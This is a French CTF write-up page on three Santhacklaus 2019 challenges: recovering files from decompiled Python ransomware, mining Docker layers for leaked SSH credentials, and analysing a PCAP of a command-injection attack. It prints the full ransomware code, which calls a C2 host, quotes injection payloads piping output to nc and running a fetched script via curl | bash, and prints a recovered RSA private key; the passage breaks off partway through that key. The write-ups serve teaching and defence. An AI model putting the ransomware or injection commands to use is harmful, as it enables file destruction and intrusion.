hacked@virus.com Le fichier “virus.cpython-37.pyc” rappelle un fichier de python compilé. Malheureusement pycdc ne décompile pas correctement le “virus”. Heureusement qu’il existe des outils en ligne pour tout et n’importe quoi: https://python-decompiler.com/ Le résultat est vraiment mieux, après corrections de quelques petites choses, on obtient le code suivant: #!/usr/bin/python3 from Crypto.Cipher import AES from Crypto.Random import get_random_bytes import hashlib, getpass, os, requests TARGET_DIR = 'C:\\\\Users' C2_URL = 'https://c2.virus.com/' TARGETS = [b'Scott Farquhar', b'Lei Jun', b'Reid Hoffman', b'Zhou Qunfei', b'Jeff Bezos', b'Shiv Nadar', b'Simon Xie', b'Ma Huateng', b'Ralph Dommermuth', b'Barry Lam', b'Nathan Blecharczyk', b'Judy Faulkner', b'William Ding', b'Scott Cook', b'Gordon Moore', b'Marc Benioff', b'Michael Dell', b'Yusaku Maezawa', b'Yuri Milner', b'Bobby Murphy', b'Larry Page', b'Henry Samueli', b'Jack Ma', b'Jen-Hsun Huang', b'Jay Y. Lee', b'Joseph Tsai', b'Dietmar Hopp', b'Henry Nicholas, III.', b'Dustin Moskovitz', b'Mike Cannon-Brookes', b'Robert Miller', b'Bill Gates', b'Garrett Camp', b'Lin Xiucheng', b'Gil Shwed', b'Sergey Brin', b'Rishi Shah', b'Denise Coates', b'Zhang Fan', b'Michael Moritz', b'Robin Li', b'Andreas von Bechtolsheim', b'Brian Acton', b'Sean Parker', b'John Doerr', b'David Cheriton', b'Brian Chesky', b'Wang Laisheng', b'Jan Koum', b'Jack Sheerack', b'Terry Gou', b'Adam Neumann', b'James Goodnight', b'Larry Ellison', b'Wang Laichun', b'Masayoshi Son', b'Min Kao', b'Hiroshi Mikitani', b'Lee Kun-Hee', b'David Sun', b'Mark Scheinberg', b'Yeung Kin-man', b'John Tu', b'Teddy Sagi', b'Frank Wang', b'Robert Pera', b'Eric Schmidt', b'Wang Xing', b'Evan Spiegel', b'Travis Kalanick', b'Steve Ballmer', b'Mark Zuckerberg', b'Jason Chang', b'Lam Wai Ying', b'Romesh T. Wadhwani', b'Liu Qiangdong', b'Jim Breyer', b'Zhang Zhidong', b'Pierre Omidyar', b'Elon Musk', b'David Filo', b'Joe Gebbia', b'Jiang Bin', b'Pan Zhengmin', b'Douglas Leone', b'Hasso Plattner', b'Paul Allen', b'Meg Whitman', b'Azim Premji', b'Fu Liquan', b'Jeff Rothschild', b'John Sall', b'Kim Jung-Ju', b'David Duffield', b'Gabe Newell', b'Scott Lin', b'Eduardo Saverin', b'Jeffrey Skoll', b'Thomas Siebel', b'Kwon Hyuk-Bin'] def get_username(): return getpass.getuser().encode() def xorbytes(a, b): assert len(a) == len(b) res = b'' for c, d in zip(a, b): res += bytes([c ^ d]) return res def lock_file(path): username = get_username() hsh = hashlib.new('md5') hsh.update(username) key = hsh.digest() cip = AES.new(key, 1) iv = get_random_bytes(16) params = (('target', username), ('path', path), ('iv', iv)) requests.get(C2_URL, params=params) with open(path, 'rb') as (fi): with open(path + '.hacked', 'wb') as (fo): block = fi.read(16) while 1: if block: while 1: if len(block) \u003c 16: block += bytes([0]) else: break cipherblock = cip.encrypt(xorbytes(block, iv)) iv = cipherblock fo.write(cipherblock) block = fi.read(16) else: break os.unlink(path) def lock_files(): username = get_username() print(username) if username in TARGETS: for directory, _, filenames in os.walk(TARGET_DIR): for filename in filenames: if filename.endswith('.hacked'): continue fullpath = os.path.join(directory, filename) print('Encrypting', fullpath) lock_file(fullpath) with open(os.path.join(TARGET_DIR, 'READ_THIS.txt'), 'wb') as (fo): fo.write(b'We have hacked all your files. Buy 1 BTC and contact us at hacked@virus.com\\n') if __name__ == '__main__': lock_files() Bien plus simple à analyser. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/:1:0","tags":["santhacklaus","h25","mathis hammel","cryptography","file format","aes","python"],"title":"[Santhacklaus 2019] - Jacques ! Au secours !","uri":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/"},{"categories":["Writeups"],"content":"Analyse du code python Rien qu’avec les imports, on voit que le malware va faire de l’AES et probablement générer clé / iv de manière aléatoire. Ensuite, les variables globales peuvent interpeler: TARGET_DIR: le repertoire à chiffrer; C2_URL: l’url du serveur de command and control de l’attaquant, en l’occurence il n’existe pas / plus; TARGETS: une ribambelle de noms et prénoms. La fonction qui va être intéressante est lock_file(path). Les premières lignes vont servir à générer la clé AES: username = get_username() hsh = hashlib.new('md5') hsh.update(username) key = hsh.digest() La clé est donc le md5 du username. Les deux lignes suivantes servent à initialiser l’AES: cip = AES.new(key, 1) # AES ECB iv = get_random_bytes(16) Il faut de l’AES ECB avec comme clé le md5(username) et génère un vecteur d’initialisation (IV). Hors, l’AES ECB n’a pas d’IV. Les deux lignes suivantes envoient les paramètres AES au serveur de command and control: params = (('target', username), ('path', path), ('iv', iv)) requests.get(C2_URL, params=params) Bon, et maintenant le vif du sujet: la crypto. On va reprendre cette fonction en ne gardant que l’algo: ''' génération de la clé ''' username = get_username() hsh = hashlib.new('md5') hsh.update(username) key = hsh.digest() ''' init de l'AES ''' cip = AES.new(key, 1) iv = get_random_bytes(16) ''' tambouille ''' with open(path, 'rb') as (fi): with open(path + '.hacked', 'wb') as (fo): block = fi.read(16) while 1: if block: while 1: if len(block) \u003c 16: block += bytes([0]) else: break cipherblock = cip.encrypt(xorbytes(block, iv)) iv = cipherblock fo.write(cipherblock) block = fi.read(16) else: break L’algo “tambouille”, rappelle l’AES CBC, utilisant l’IV. A savoir que la différence entre l’AES ECB et CBC est justement ce vecteur d’initialisation. Le schéma suivant représente l’AES CBC lors du chiffrement: On admet donc que c’est de l’AES CBC dont on connait la clé mais pas l’IV. On peut dire qu’on connait la clé, car les usernames utilisées sont présent dans la liste TARGETS, il suffira de bruteforce pour trouver le bon. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/:2:0","tags":["santhacklaus","h25","mathis hammel","cryptography","file format","aes","python"],"title":"[Santhacklaus 2019] - Jacques ! Au secours !","uri":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/"},{"categories":["Writeups"],"content":"Euréka Analysons les informations en notre possessions: Images JPEG chiffrées AES CBC dont on connait la clé mais pas l’IV Et ci-dessous le schéma de déchiffrement de l’AES CBC: Le schéma ci-dessus donne une information vraiment intéressante: si on ne connais pas l’IV, seul le premier block sera illisible, mais tout le reste se base sur la clé. On peut faire un test très simple: #!/usr/bin/python3 from Crypto.Cipher import AES from Crypto.Random import get_random_bytes import hashlib def md5_fn(a): hsh = hashlib.new('md5') hsh.update(a) return hsh.digest() def decrypt(key): a = AES.new(key, AES.MODE_CBC, b'\\x00'*16) return a.decrypt(ENC_DATA) def encrypt(key): iv = get_random_bytes(16) a = AES.new(key, AES.MODE_CBC, iv) return a.encrypt(DATA) KEY = md5_fn(b'maki') DATA = b\"Coucou j'aime beaucoup les fleurs, surtout quand elle sentent bo\" # Oui c'est juste pour que ça fasse un multiple de 16 ENC_DATA = encrypt(KEY) print(decrypt(KEY)) On génère un chiffré d’une string connue avec un IV aléatoire et on déchiffre avec la clé mais un IV fait que de null bytes. Ce snippet retourne: b’\\xf3fw\\xf6\\x15MFTq\\xbd\\xad\\x9c\\xbd\\x06\\xad\\x83aucoup les fleurs, surtout quand elle sentent bo' Seul le premier block est illisible. Le second est parfaitement déchiffré. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/:3:0","tags":["santhacklaus","h25","mathis hammel","cryptography","file format","aes","python"],"title":"[Santhacklaus 2019] - Jacques ! Au secours !","uri":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/"},{"categories":["Writeups"],"content":"Format JPEG Intéressons nous au format JPEG, pour savoir s’il est possible de reconstruire ce premier block. Prenons 3 images aléatoires sur Google images: http://image.jeuxvideo.com/medias-md/157675/1576752756-4689-card.jpg https://static.lpnt.fr/images/2017/08/07/9591045lpw-9591057-article-jpg_4474173_980x426.jpg https://www.digital.security/fr/sites/default/files/illu-actu/logo_digital-security.jpg $ file *.jpg 1576752756-4689-card.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 768x432, components 3 9591045lpw-9591057-article-jpg_4474173_980x426.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 980x426, components 3 logo_digital-security.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 100x100, segment length 16, progressive, precision 8, 440x260, components 3 Maintenant regardons les headers de ces 3 images JPEG: for i in $(ls *.jpg); do hexdump -C $i|head -n 2 \u0026\u0026 echo \"\"; done Une bonne partie du premier block est identique. En patchant le future fichier déchiffré avec: ff d8 ff e0 00 10 4a 46 49 46 00 01 01 00 00 01 Alors il est possible que l’image soit déchiffrée malgrès l’absence de l’IV. Cependant, avant de faire ça, il faut trouver le bon username pour trouver la clé AES. Pour cela, on sait que le premier bloc déchiffré sera le dernier bloc de la photo. De plus, on sait qu’un fichier JPEG se termine toujours par \\xff\\xd9: for i in $(ls *.jpg); do hexdump -C $i|tail -n2 \u0026\u0026 echo \"\"; done ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/:4:0","tags":["santhacklaus","h25","mathis hammel","cryptography","file format","aes","python"],"title":"[Santhacklaus 2019] - Jacques ! Au secours !","uri":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/"},{"categories":["Writeups"],"content":"Trouver la clé AES Sachant ça, on peut supposer que le username utilisé est dans la liste “TARGETS”. Le snippet suivant va bruteforce jusqu’à trouver la signature de fin: #!/usr/bin/python3 from Crypto.Cipher import AES import hashlib DATA = open('DCIM-0533.jpg.hacked','rb').read() TARGETS = [b'Scott Farquhar', b'Lei Jun', b'Reid Hoffman', b'Zhou Qunfei', b'Jeff Bezos', b'Shiv Nadar', b'Simon Xie', b'Ma Huateng', b'Ralph Dommermuth', b'Barry Lam', b'Nathan Blecharczyk', b'Judy Faulkner', b'William Ding', b'Scott Cook', b'Gordon Moore', b'Marc Benioff', b'Michael Dell', b'Yusaku Maezawa', b'Yuri Milner', b'Bobby Murphy', b'Larry Page', b'Henry Samueli', b'Jack Ma', b'Jen-Hsun Huang', b'Jay Y. Lee', b'Joseph Tsai', b'Dietmar Hopp', b'Henry Nicholas, III.', b'Dustin Moskovitz', b'Mike Cannon-Brookes', b'Robert Miller', b'Bill Gates', b'Garrett Camp', b'Lin Xiucheng', b'Gil Shwed', b'Sergey Brin', b'Rishi Shah', b'Denise Coates', b'Zhang Fan', b'Michael Moritz', b'Robin Li', b'Andreas von Bechtolsheim', b'Brian Acton', b'Sean Parker', b'John Doerr', b'David Cheriton', b'Brian Chesky', b'Wang Laisheng', b'Jan Koum', b'Jack Sheerack', b'Terry Gou', b'Adam Neumann', b'James Goodnight', b'Larry Ellison', b'Wang Laichun', b'Masayoshi Son', b'Min Kao', b'Hiroshi Mikitani', b'Lee Kun-Hee', b'David Sun', b'Mark Scheinberg', b'Yeung Kin-man', b'John Tu', b'Teddy Sagi', b'Frank Wang', b'Robert Pera', b'Eric Schmidt', b'Wang Xing', b'Evan Spiegel', b'Travis Kalanick', b'Steve Ballmer', b'Mark Zuckerberg', b'Jason Chang', b'Lam Wai Ying', b'Romesh T. Wadhwani', b'Liu Qiangdong', b'Jim Breyer', b'Zhang Zhidong', b'Pierre Omidyar', b'Elon Musk', b'David Filo', b'Joe Gebbia', b'Jiang Bin', b'Pan Zhengmin', b'Douglas Leone', b'Hasso Plattner', b'Paul Allen', b'Meg Whitman', b'Azim Premji', b'Fu Liquan', b'Jeff Rothschild', b'John Sall', b'Kim Jung-Ju', b'David Duffield', b'Gabe Newell', b'Scott Lin', b'Eduardo Saverin', b'Jeffrey Skoll', b'Thomas Siebel', b'Kwon Hyuk-Bin'] def md5_fn(a): hsh = hashlib.new('md5') hsh.update(a) return hsh.digest() def decrypt(key): a = AES.new(key, AES.MODE_CBC, b'\\x00'*16) return a.decrypt(DATA) for i in TARGETS: key = md5_fn(i) plain = decrypt(key).rstrip(b'\\x00') if plain.endswith(b'\\xff\\xd9'): print(i) Jack Sheerack Le MD5 de ce username est donc la clé. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/:5:0","tags":["santhacklaus","h25","mathis hammel","cryptography","file format","aes","python"],"title":"[Santhacklaus 2019] - Jacques ! Au secours !","uri":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/"},{"categories":["Writeups"],"content":"Déchiffrer les images Maintenant qu’on a la clé et qu’on peut potentiellement reconstruire le header d’un JPEG, il ne reste qu’à tester sur une image: #!/usr/bin/python3 from Crypto.Cipher import AES import hashlib, binascii def md5_fn(a): hsh = hashlib.new('md5') hsh.update(a) return hsh.digest() def decrypt(key): a = AES.new(key, AES.MODE_CBC, b'\\x00'*16) return a.decrypt(DATA) DATA = open('DCIM-0534.jpg.hacked','rb').read() KEY = md5_fn(b'Jack Sheerack') a = binascii.unhexlify('ffd8ffe000104a464946000101000001') # On va venir patcher les 16 premiers octets avec ceux d'une des images trouvées sur internet open('clear.jpg','wb').write(a+decrypt(KEY)[16:]) Ce qui donne: ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/:6:0","tags":["santhacklaus","h25","mathis hammel","cryptography","file format","aes","python"],"title":"[Santhacklaus 2019] - Jacques ! Au secours !","uri":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/"},{"categories":["Writeups"],"content":"Flag SANTA{Jacques_Th3_R1pp3R} ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/:7:0","tags":["santhacklaus","h25","mathis hammel","cryptography","file format","aes","python"],"title":"[Santhacklaus 2019] - Jacques ! Au secours !","uri":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/"},{"categories":["Writeups"],"content":" It looks like a naughty developer has been deploying a Docker image on a Santa production server a few days before Christmas. He was in a rush and was not able to properly pass all security checks on the built Docker image. Would be a shame if this image could give you an SSH access to the production server… http://46.30.204.47\" ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019naughtydockre/:0:0","tags":["santhacklaus","claranet","forensic","docker"],"title":"[Santhacklaus 2019] - Naughty Docker","uri":"maki.bzh/writeups/santhacklaus2019naughtydockre/"},{"categories":["Writeups"],"content":"Etat des lieux En allant sur l’IP donnée dans l’énoncé, on trouve une note nous donnait accès au docker en question. Avec cette note, on sait que l’on cherche un accès SSH donc potentiellement: username ; password et / ou clé ; adresse IP de la machine de prod ; port ssh si non standard (22/TCP). La première chose à faire est donc de récupérer ce docker: \u003e docker run --rm -p 3000:3000 -d santactf/app Unable to find image 'santactf/app:latest' locally latest: Pulling from santactf/app 844c33c7e6ea: Pull complete ada5d61ae65d: Pull complete f8427fdf4292: Pull complete f025bafc4ab8: Pull complete 7a9577c07934: Pull complete add4f74c413b: Pull complete 1ee7a33fb93f: Pull complete 08ab1881dcea: Pull complete 96f3027f0dbd: Pull complete cb67eac57f41: Pull complete bf44330d5df8: Pull complete 4932e843cace: Pull complete f0b9c596601c: Pull complete Digest: sha256:621c884f7ddd0351fbb114e0b9c1d4d3b0e309cb5c5efc9ce872fd201af79cad Status: Downloaded newer image for santactf/app:latest fe704e6f41dc44e27d32d4b6de9d64cc7bf520cfcdc94c2c15b7e35acc3214b0 \u003e docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fe704e6f41dc santactf/app \"docker-entrypoint.s…\" 51 seconds ago Up 49 seconds 0.0.0.0:3000-\u003e3000/tcp cranky_khorana Avant de commencer dans le vif du challenge, une petite recherche google a permis d’avoir des pistes à creuser: https://www.intrinsec.com/docker-leak/ Même si leur outil a l’air vraiment jolie, on va le faire à l’ancienne: avec du bash et du cervelet. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019naughtydockre/:1:0","tags":["santhacklaus","claranet","forensic","docker"],"title":"[Santhacklaus 2019] - Naughty Docker","uri":"maki.bzh/writeups/santhacklaus2019naughtydockre/"},{"categories":["Writeups"],"content":"Différence entre docker save et export Avant de faire un docker save de notre image, il est important de s’intéresser à la différence entre un docker save et un docker export. Les deux ont plus ou moins la même finalité: sauvegarder un container et le redéployer. La différence majeure est qu’un docker export ne va pas garder les meta données, ni les layer d’un container. Quant à un docker save, il va tout récupérer et faire un beau tar avec. Le tool de intrinsec se base sur les layer du container pour permettre à l’utilisateur de chercher à l’intérieur et ainsi récupérer des secrets. Cet article en parle bien : https://tuhrig.de/difference-between-save-and-export-in-docker/ ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019naughtydockre/:2:0","tags":["santhacklaus","claranet","forensic","docker"],"title":"[Santhacklaus 2019] - Naughty Docker","uri":"maki.bzh/writeups/santhacklaus2019naughtydockre/"},{"categories":["Writeups"],"content":"Sauver le soldat Santa On peut voir sur l’image suivante, que l’archive tar générée par docker save contient l’architecture suivante: hash.tar: un hash par layer; json: l’état du docker au moment du layer; layer.tar: l’ensemble des fichiers du layer; VERSION: la version du docker. hash.json: un “résumé” de tous les layers générés et les commandes associés; manifest.json: répertorie tous les hashs des différents layers; repositories (format json): contient le hash de la dernière version du docker. Les données que l’on chercher doivent être dans un des “layer.tar”. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019naughtydockre/:3:0","tags":["santhacklaus","claranet","forensic","docker"],"title":"[Santhacklaus 2019] - Naughty Docker","uri":"maki.bzh/writeups/santhacklaus2019naughtydockre/"},{"categories":["Writeups"],"content":"Localiser les fichiers utiles La première chose à faire est de lister l’ensemble des fichiers dans les différents “layer.tar”, ça sera plus simple pour grepper dedans après: $ for i in $(ls | grep -E '^[a-f0-9]{64}$'); do tar -tf $i/layer.tar |tee \"$i\"_out; done $ ls |grep out 0425a7cec03536e53ffcd89abeab827ee12987209a0d31085b43cf01b8c8b2cb_out 05f684efc5012328cdbde4e3814eed1240f41d06e4dcb44506705a7705cf199e_out 34c306ec137d785a0422942d8960b913fa7ff1ec66339b699bb3de02ce6770c6_out 3b139c8076d9c5ea6935edb9f644a4dd9caec1acb1217b9492fae4bbe3ff3725_out 5c1926c54c7194b9886f0007f2cfa0a9e166b8985842e55fc9d8e888254663de_out 986a7d85c875d79a1cd37dcd7e4e110cbf6ede072d062dfb0eaf10f006ebefd9_out a67d35ec1f3fd055009a18e40d35ccbbb31da927e5d2c421ec43e98db0d08678_out a934c4c71d618bab83432e24a12640ff9d474df3529fa790cb0f9d059d82c7dd_out b4d27d4e4f5bb8bfe5bc92f8b3cbf3f0f5042fe120a40833fc0247deb728f961_out b5116739ab4c01c43f0ba2feab4358c367ca86c085fad5223ce03d6bb7933fe3_out be3d4ffa7682700bcbc51a8655568428c4979c5464169a286208e9e03f7673a5_out c03933430e12aa2893ee247934be44c86f5c1878904d7a1bfe665ccd548bde5d_out f0e0774e1b8e3c943a4b910e773664c81cfcadda8a388040c842fb37b8a0e467_out Dans le fichier ddde36e2209357c424cca26ac5a0b46c2f864be797c053bed700422177ba7261.json, le résumé de tous les layers, on peut voir que l’utilisateur supprime le .bash_history et le .bashrc: $ cat ddde36e2209357c424cca26ac5a0b46c2f864be797c053bed700422177ba7261.json | jq Maintenant, il faut localiser un “layer.tar” contenant un .bash_history: $ grep -ari '/\\.bash..' *_out Il semblerait que notre archive soit le layer: be3d4ffa7682700bcbc51a8655568428c4979c5464169a286208e9e03f7673a5 ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019naughtydockre/:4:0","tags":["santhacklaus","claranet","forensic","docker"],"title":"[Santhacklaus 2019] - Naughty Docker","uri":"maki.bzh/writeups/santhacklaus2019naughtydockre/"},{"categories":["Writeups"],"content":"Extraction des premières informations Il semblerait que la logique soit bonne: $ cd be3d4ffa7682700bcbc51a8655568428c4979c5464169a286208e9e03f7673a5 \u0026\u0026 tar xvf layer.tar Les fameux fichiers supprimés, mais aussi des archives de backup, ça sent bon. Avec un simple cat sur ce fichier, on voit qu’il a fait beaucoup de commandes: $ cat .bash_history |wc -l 153 Mais on sait qu’on cherche de quoi se connecter en ssh: $ cat .bash_history | grep ssh Dans la liste des informations à trouver, on vient de récupérer: username: rudolf-the-reindeer ; adresse IP de la machine de prod: 46.30.204.47 ; port ssh si non standard (22/TCP): 5700. Il nous manque donc un mot de passe ou une clé. Normalement, c’est à ce moment qu’on se demande “Mais que contiennent les backups ?”: Ca tombe bien. Pour info, un unzip -l * ne fonctionne pas, je ne me suis pas amusé à faire un for pour le plaisir. De toute façon, nous sommes face à une archive chiffrée: ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019naughtydockre/:5:0","tags":["santhacklaus","claranet","forensic","docker"],"title":"[Santhacklaus 2019] - Naughty Docker","uri":"maki.bzh/writeups/santhacklaus2019naughtydockre/"},{"categories":["Writeups"],"content":"Déchiffrement du zip S’il a créé un zip chiffré, il a dû faire la commande zip à un moment donné. Regardons dans le .bash_history: Une variable d’environnement pour le password, ça nous fait une belle jambe. Il n’y a plus qu’à espérer que cette variable ait été initialisée dans ce même bash: On a encore eu de la chance. Le mot de passe du zip est donc 25362. Lors de l’extraction d’un zip, quelque chose de rigolo se passe: Après, il y a 9 zip, c’est peut être la clé de l’un d’entre eux. Pour celà, bash for the win: $ for i in $(ls); do echo $i \u0026\u0026 7z t $i -p25362|grep Ok; done Il semblerait qu’une archive puisse être déchiffrée: dev_141219_backup.zip Bonne nouvelle… Enfin presque: Il semblerait que l’authentification SSH ait besoin d’une clé ET d’un mot de passe. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019naughtydockre/:6:0","tags":["santhacklaus","claranet","forensic","docker"],"title":"[Santhacklaus 2019] - Naughty Docker","uri":"maki.bzh/writeups/santhacklaus2019naughtydockre/"},{"categories":["Writeups"],"content":"El famoso passwordo Je dois avouer que j’ai passé un peu de temps à chercher ce mot de passe dans les autres layers, bruteforce sans succès les autres zip pour voir si la clé changeait, etc… Mais au final, je me suis rappelé qu’à la création de ce layer, l’utilisateur avait supprimé 2 fichiers: .bash_history .bashrc Que contient le .bashrc: $ cat .bashrc|grep -v '#' La fameux mot de passe: HoHoHo2020!NorthPole Il ne reste qu’à se connecter et collecter ce flag tant attendu: ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019naughtydockre/:7:0","tags":["santhacklaus","claranet","forensic","docker"],"title":"[Santhacklaus 2019] - Naughty Docker","uri":"maki.bzh/writeups/santhacklaus2019naughtydockre/"},{"categories":["Writeups"],"content":"Flag SANTA{NeverTrustDockerImages7263} ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019naughtydockre/:8:0","tags":["santhacklaus","claranet","forensic","docker"],"title":"[Santhacklaus 2019] - Naughty Docker","uri":"maki.bzh/writeups/santhacklaus2019naughtydockre/"},{"categories":["Writeups"],"content":" Suspicious activity has been detected. Probably nothing to be scared about but take a look anyway. If you find anything, a backdoor, a malware or anything of this kind, flag is the sha256 of it. MD5 of the file : c93adc996da5dda82312e43e9a91d053 PCAP : https://mega.nz/#!eqQV3SwD!_jAfHMqMw9d-LIDoTDR9JziwNicsxkYymS87eR4pLUg ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019revmomon/:0:0","tags":["santhacklaus","claranet","forensic","cryptography","network","pcap","malware","rsa"],"title":"[Santhacklaus 2019] - Revmomon","uri":"maki.bzh/writeups/santhacklaus2019revmomon/"},{"categories":["Writeups"],"content":"Etat des lieux A l’ouverture du PCAP, on peut voir énormément de paquets entre l’ip 172.17.0.5 et 172.17.0.1. Du premier paquet au 170281, c’est une alternance de paquets SYN / RST, caractéristique d’un Stealth Scan de nmap. Il est possible de le voir autrement grâce aux premiers ports scannés : Enfin le user agent “Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\" est plutot clair. La première hypothèse est de voir que l’ip 172.17.0.1 est l’attaquant et 172.17.0.5 est l’attaqué. Il y a un peu de traffic externe, pour ne pas se faire polluer par le reste, un premier filtre est de rigueur : ip.addr == 172.17.0.1 \u0026\u0026 ip.addr == 172.17.0.5 Au final la première réelle action utilisateur semble être au stream TCP 85663, car un paramètre POST valide, avec un argument cohérent est passé. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019revmomon/:0:1","tags":["santhacklaus","claranet","forensic","cryptography","network","pcap","malware","rsa"],"title":"[Santhacklaus 2019] - Revmomon","uri":"maki.bzh/writeups/santhacklaus2019revmomon/"},{"categories":["Writeups"],"content":"Point d’entré de l’attaquant Au stream TCP 85664, on peut voir qu’une injection de commande a été tentée : 127.0.0.1; id | nc 172.17.0.1 12345 Et cette injection de commande a l’air d’avoir fonctionné : ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019revmomon/:0:2","tags":["santhacklaus","claranet","forensic","cryptography","network","pcap","malware","rsa"],"title":"[Santhacklaus 2019] - Revmomon","uri":"maki.bzh/writeups/santhacklaus2019revmomon/"},{"categories":["Writeups"],"content":"Exploitation de l’attaquant L’attaquant semble executer un script en mémoire : 127.0.0.1 ; curl -k https://172.17.0.1/a.sh | bash Bien entendu ce site n’est pas accessible il n’est pas possible de récupérer le script a.sh. Les stream tcp suivant (85667 / 85668) doit être le téléchargement wget via https. Une différence intéressante réside dans le changement de port entre le stream 85668 (port 443 sur l’ip de l’attaquant) et le stream 85669 (port 8443 sur l’ip de l’attaquant). Vu la tete des paquets TCP, on peut se douter que c’est du TLS : Donc un peu de configuration wireshark pour le dissector TLS fasse son travail sur le port 8443, il faut modifier la config du HTTP : Finalement on voit bien un “Client Hello” sur le port 8443 : Avant de passer à la suite, on a pu déterminer que l’exploitation a commencé au stream tcp 85664, soit le paquet 183387. On va appliquer un filtre pour masquer tous les paquets d’avant et enregistrer ce nouveau pcap. Ce sera plus simple à manipuler qu’un pcap de 35 Mo. Le filtre wireshark : (frame.number \u003e= 183387) \u0026\u0026 (ip.addr == 172.17.0.1 \u0026\u0026 ip.addr == 172.17.0.5) Et “File \u003e Exported Selected Packet” On passe de 185701 paquets à 2077, ce qui est plus confortable. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019revmomon/:0:3","tags":["santhacklaus","claranet","forensic","cryptography","network","pcap","malware","rsa"],"title":"[Santhacklaus 2019] - Revmomon","uri":"maki.bzh/writeups/santhacklaus2019revmomon/"},{"categories":["Writeups"],"content":"Crypto attack Trouver la vuln On récupère le “Server Hello” de la connexion sur le port 443 et 8443. Première chose intéressante, les “issuer”: Référence à “Prime Minister” dans les deux. De plus, malgrés les suites de chiffrement safe proposées par le client, le serveur a décidé d’utiliser une suite n’utilisant pas Diffie Hellman: Référence à prime, pas de diffie hellman -\u003e attaque sur le rsa ? S’il est possible de récupérer une clé privé, alors il sera possible de déchiffrer les communications. S’il y avait eu un DH, DHE, ECDH ou ECDHE, alors il aurait fallu connaitre cet aléa échangé. Enfin, un certificat ssl est la composante publique du RSA, donc les attaques classiques de RSA sur clé publiques sont possibles. Extraction des certificats Pour cela, il faut extraire les certificat. CLquer sur le trame “Server Hello” et selectionner le “Certificate” dans le paquet: Un CTRL+MAJ+X ou File \u003e Export Packet Bytes et le certificat est extrait. Il faut faire la meme chose pour l’autre port. Conversion DER to PEM Avant de faire une attaque avec RsaCtfTool, qui a l’avantage de tester tout un tas d’attaque, l faut convertir ces certificat DER au format PEM: # DER to CRT openssl x509 -inform der -in 5_443.der -outform pem -out 5_443.crt openssl x509 -inform der -in 5_8443.der -outform pem -out 5_8443.crt # CRT to PEM openssl x509 -pubkey -noout -in 5_443.crt -out 5_443.pem openssl x509 -pubkey -noout -in 5_8443.crt -out 5_8443.pem Facteur commun Pour lancer RsaCtfTool sur plusieurs clés publiques il suffit de: ➜ writeup git:(master) ✗ /opt/tools/crypto/RsaCtfTool/RsaCtfTool.py --publickey \"*.pem\" --private --verbose [*] Multikey mode using keys: ['5_8443.pem', '5_443.pem'] [*] Found common factor in modulus for 5_8443.pem and 5_443.pem -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEA8k6sQzkomqCjeOPJ10idYw5K/EJ/crLCWcKZy79hyOiIAHbn P3icrfeD8S7qnb6HwMyKvuu1rLkABP8RUVClDlfyMKcZMO8p8kgj+xs82FzMJBeJ iEsqSG6t/8zp26/W1oqtGWpderbaO0eZj03ExuyoedbNggfuYCqe7AB9WB8/B7p3 TEjwnNE7bRc4RBL5KhqzB2plYrrNDqhor5jo/RBgDGdnQGMEo0+A8oZPGzmq4d+l E2TxA4FCXKBw2M6C+PdmwkktK1ZF26w/Mk0gEO5DVh0MgPkumEFifTmq9QgpUy8q ki/j8yI320MmF6WQer4qtgFpdmFwUQb6KvKnSQIDAQABAoIBAHp/Y38oqmphw8Me BbCcuVSWqToWtC/cR3zxcKccvebAB+GUOxxPcYZRl5aazWmqJR9HSO10ZIhJjsT3 3l1pk8hIldwa3hVrE5208tvDzWLkpx+n9pO8zEeKDNVBVwkFQGt9+DzdFR0wy+sk K3HTMyQOCK5v9b1DHTPo2CcfqD6fsXW1cG3VfqlvT+iXyp9Z8hreA78MTEnfSzVW g/UMUn1Y/ZjiO7l34JBm2Q0aiHBiRdBIatTDDw9uATrY491Ut/bRCWo9++iC7Kz0 t5jH28YynQp7upq2ZaLtb3QA/aggEdTN+jWs/EZSmdSY1JN2zUrPkJ81FR3vw+/z paUe27ECgYEA9Qgo401V7TQhlP0XNKsWFuH6GwmZKEBBtXBF9nk26CbTZ+Er6SS0 tm3zYqUH+VkdnO+c//S/FmG/eSi3e4kB5dGsskzGzjjJzbtACenn1SRBUo0TfCZy 